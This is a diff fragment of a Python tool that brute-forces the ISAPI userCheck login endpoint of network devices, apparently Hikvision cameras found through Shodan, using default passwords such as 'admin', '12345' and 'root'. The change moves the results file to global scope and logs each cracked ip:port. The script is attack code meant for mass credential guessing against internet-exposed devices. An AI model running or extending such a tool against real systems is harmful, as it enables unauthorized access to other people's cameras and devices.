@@ -7,7 +7,7 @@ def convertoToBase64(value):
     encoded_data = base64.b64encode(value.encode('utf-8'))
     return encoded_data.decode('utf-8')
 def brute(ip, port):
-    file = open("found-users.txt", "w")
+    
     password = ["admin", "12345", "root"]
     user = 'admin'
     link=""
@@ -32,10 +32,10 @@ def brute(ip, port):
         req = requests.post(host+'/ISAPI/Security/userCheck', headers=headers)
         if req.status_code == 200:
             print("[!] Found user: " + user+"-"+str(i))
-            file.write("[!] Found user: " + user+"-"+str(i))
-        else:
+            file.write("\n[!] Found user: " + user+"-"+str(i)+ " for "+ip+":"+port)
+        else: 
             print("[+] "+user+":"+i+" - Incorrect!")
-    file.close()
+    
 
 
 
@@ -71,10 +71,10 @@ required.add_argument('-sb', '--scan-brute', action='store_true', help='Scan and
 parser.add_argument('-api', '--apitoken', type=str, help='Shodan API token', required=True)
 args = parser.parse_args()
 token = args.apitoken
-
+file = open("found-users.txt", "w")
 if args.scan:
 	scan(False, token)
 else:
     scan(True, token) #scan with brute
 
-
+file.close()
